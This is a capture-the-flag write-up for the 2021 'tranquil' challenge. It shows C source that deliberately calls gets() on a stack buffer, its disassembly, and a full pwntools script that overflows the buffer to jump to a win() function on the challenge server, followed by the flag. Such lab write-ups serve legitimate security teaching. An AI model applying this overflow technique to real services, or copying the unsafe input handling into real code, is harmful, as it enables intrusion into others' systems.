# tranquil

Finally, inner peace - Master Oogway

Source

Connect with nc shell.actf.co 21830, or find it on the shell server at /problems/2021/tranquil.

Author: JoshDaBosh

## Challenge

We're given a password prompt.
Entering the correct password gives us a success message and nothing else.

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### Source code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int win(){
    char flag[128];
    
    FILE *file = fopen("flag.txt","r");
    
    if (!file) {
        printf("Missing flag.txt. Contact an admin if you see this on remote.");
        exit(1);
    }
    
    fgets(flag, 128, file);
    
    puts(flag);
}

int vuln(){
    char password[64];
    
    puts("Enter the secret word: ");
    
    gets(&password);
    
    
    if(strcmp(password, "password123") == 0){
        puts("Logged in! The flag is somewhere else though...");
    } else {
        puts("Login failed!");
    }
    
    return 0;
}

int main(){
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    vuln();
    
    // not so easy for you!
    // win();
    
    return 0;
}
```

## Solution

We can see that the `vuln` function contains an unsafe call to `gets`.

If we disassemble the function, we can find the size of the buffer and the offset to RBP:

```asm
[0x004010b0]> pdf @ sym.vuln
            ; CALL XREF from main @ 0x401292
┌ 93: sym.vuln ();
│           ; var char *s1 @ rbp-0x40
│           0x00401204      55             push rbp
│           0x00401205      4889e5         mov rbp, rsp
│           0x00401208      4883ec40       sub rsp, 0x40
│           0x0040120c      488d3d430e00.  lea rdi, str.Enter_the_secret_word:_ ; 0x402056 ; "Enter the secret word: " ; const char *s
│           0x00401213      e818feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00401218      488d45c0       lea rax, [s1]
│           0x0040121c      4889c7         mov rdi, rax                ; char *s
│           0x0040121f      b800000000     mov eax, 0
│           0x00401224      e857feffff     call sym.imp.gets           ; char *gets(char *s)
│           0x00401229      488d45c0       lea rax, [s1]
│           0x0040122d      488d353a0e00.  lea rsi, str.password123    ; 0x40206e ; "password123" ; const char *s2
│           0x00401234      4889c7         mov rdi, rax                ; const char *s1
│           0x00401237      e834feffff     call sym.imp.strcmp         ; int strcmp(const char *s1, const char *s2)
│           0x0040123c      85c0           test eax, eax
│       ┌─< 0x0040123e      750e           jne 0x40124e
│       │   0x00401240      488d3d390e00.  lea rdi, str.Logged_in__The_flag_is_somewhere_else_though... ; 0x402080 ; "Logged in! The flag is somewhere else though..." ; const char *s
│       │   0x00401247      e8e4fdffff     call sym.imp.puts           ; int puts(const char *s)
│      ┌──< 0x0040124c      eb0c           jmp 0x40125a
│      ││   ; CODE XREF from sym.vuln @ 0x40123e
│      │└─> 0x0040124e      488d3d5b0e00.  lea rdi, str.Login_failed_  ; 0x4020b0 ; "Login failed!" ; const char *s
│      │    0x00401255      e8d6fdffff     call sym.imp.puts           ; int puts(const char *s)
│      │    ; CODE XREF from sym.vuln @ 0x40124c
│      └──> 0x0040125a      b800000000     mov eax, 0
│           0x0040125f      c9             leave
└           0x00401260      c3             ret
```

By overflowing this buffer, we can change the stored RIP to point at the address of the `win` function.

## Exploit

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host shell.actf.co --port 21830 tranquil
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('tranquil')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'shell.actf.co'
port = int(args.PORT or 21830)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

win = 0x00401196

payload = flat({0x48: win})

io.sendline(payload)

io.interactive()
```

## Flag

`actf{time_has_gone_so_fast_watching_the_leaves_fall_from_our_instruction_pointer_864f647975d259d7a5bee6e1}`

